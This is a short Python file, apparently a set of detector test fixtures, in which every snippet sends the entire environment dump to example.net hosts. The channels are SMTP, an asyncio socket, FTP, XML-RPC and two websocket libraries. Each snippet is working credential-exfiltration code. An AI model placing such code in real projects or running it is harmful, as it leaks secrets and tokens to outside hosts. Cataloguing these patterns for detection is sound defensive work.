import asyncio
import ftplib
import io
import json
import os
import smtplib
import xmlrpc.client
from email.message import EmailMessage

import websocket
import websockets

# smtplib: the dump is the mail body.
with smtplib.SMTP("smtp.example.net") as smtp:
    smtp.sendmail("ci@example.net", ["drop@example.net"], json.dumps(dict(os.environ)))

# smtplib: the dump goes into a message, and send_message sends it.
message = EmailMessage()
message.set_content(str(os.environ.copy()))
mailer = smtplib.SMTP_SSL("smtp.example.net")
mailer.send_message(message)


# asyncio: the writer of a connection sends.
async def beacon():
    reader, writer = await asyncio.open_connection("collector.example.net", 9000)
    writer.write(json.dumps({**os.environ}).encode())


# ftplib: the dump is an uploaded file.
ftp = ftplib.FTP("ftp.example.net")
ftp.storbinary("STOR env.json", io.BytesIO(json.dumps(list(os.environ.items())).encode()))

# xmlrpc: each method of a proxy is a remote call.
proxy = xmlrpc.client.ServerProxy("https://rpc.example.net/")
proxy.report(dict(os.environ))

# websocket-client: the connection sends the dump.
ws = websocket.create_connection("wss://collector.example.net/ws")
ws.send(json.dumps(os.environ.copy()))


# websockets: the connection sends the dump.
async def stream():
    async with websockets.connect("wss://collector.example.net/ws") as channel:
        await channel.send(str(dict(os.environ)))
